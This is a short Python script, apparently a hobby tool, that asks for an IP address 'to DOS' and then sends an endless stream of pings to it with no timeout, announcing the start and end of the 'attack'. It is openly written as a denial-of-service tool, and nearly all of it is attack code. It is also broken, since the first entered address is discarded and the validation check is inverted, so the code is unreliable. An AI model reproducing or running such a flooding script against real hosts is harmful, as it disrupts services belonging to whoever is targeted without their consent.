import pythonping
import re

IP_REGEX_PATTERN_STRING = r'^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
IP_REGEX_MATCHER = re.compile(IP_REGEX_PATTERN_STRING)


def get_ip_from_user() -> str:
    input("Enter an ip address to DOS: \n"
          "> ")

    while not IP_REGEX_MATCHER.match(ip) is not None:
        ip = input("Invalid IP address, please try again: \n"
                   "> ")

    return ip

def commit_DDOS() -> None:
    ip: str = get_ip_from_user()

    print("Beginning attack, press CTRL+C at any moment to stop.")
    try:
        while True:
            # By setting the timeout to 0, we can continuously send ping messages
            # without waiting for the response, as we don't care about it.
            pythonping.ping(ip, verbose=True, timeout=0)
    except (KeyboardInterrupt, InterruptedError):
        print("\nAttack Terminated.")
    except BaseException:
        print("An exception occurred, abandoning attack.")

def main():
    commit_DDOS()

if __name__ == '__main__':
    main()

